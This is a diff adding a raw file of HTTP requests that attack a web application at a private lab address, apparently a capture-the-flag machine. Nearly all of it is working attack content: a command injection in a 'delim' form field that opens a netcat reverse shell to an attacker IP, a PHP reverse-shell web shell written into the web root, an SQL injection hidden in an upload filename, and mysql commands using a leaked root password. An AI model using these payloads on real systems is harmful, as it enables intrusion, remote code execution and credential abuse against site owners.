@@ -1,0 +1,95 @@
+#create user
+
+POST http://10.10.11.104/accounts.php HTTP/1.1
+Proxy-Connection: keep-alive
+Content-Length: 61
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://10.10.11.104
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://10.10.11.104/login.php
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=57atksq5j9ggdgsl16b6sjar10
+Host: 10.10.11.104
+
+username=tilli&password=123456&confirm=123456&submit=
+
+
+#reverse_shell
+POST http://10.10.11.104/logs.php HTTP/1.1
+Proxy-Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=57atksq5j9ggdgsl16b6sjar10
+Content-Length: 61
+Content-Type: application/x-www-form-urlencoded
+Host: 10.10.11.104
+
+delim=1;nc -c sh 10.10.14.45 4444;mktemp -u XXX > /var/www/out.log
+
+
+#sql injection
+POST http://10.10.11.104/files.php HTTP/1.1
+Proxy-Connection: keep-alive
+Content-Length: 216
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://10.10.11.104
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBifQfBFOAO7bHwz8
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://10.10.11.104/files.php
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=57atksq5j9ggdgsl16b6sjar10
+Host: 10.10.11.104
+
+------WebKitFormBoundaryBifQfBFOAO7bHwz8
+Content-Disposition: form-data; name="userData"; filename="1', '1', '1', 'tilli')#"
+Content-Type: application/octet-stream
+
+1
+------WebKitFormBoundaryBifQfBFOAO7bHwz8--
+
+POST http://10.10.11.104/logs.php HTTP/1.1
+Proxy-Connection: keep-alive
+Content-Length: 109
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://10.10.11.104
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://10.10.11.104/file_logs.php
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=3c1d0tmnfun6sm7l1cs5utiveq
+Host: 10.10.11.104
+
+delim=space;mysql --user=root --password='mySQL_p@ssw0rd!:)' --execute='system id' previse > /var/www/out.log
+
+#reverse with php
+POST http://10.10.11.104/logs.php HTTP/1.1
+Proxy-Connection: keep-alive
+Content-Length: 161
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://10.10.11.104
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://10.10.11.104/file_logs.php
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=3c1d0tmnfun6sm7l1cs5utiveq
+Host: 10.10.11.104
+
+delim=space; printf '<?php $sock=fsockopen("10.10.14.178",4444);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>' | tee /var/www/html/r3.php
+
+
+mysql --user=root --password='mySQL_p@ssw0rd!:)' previse
+
+
+
+for i in {70..100};do python delete_files_req.py $i; done;
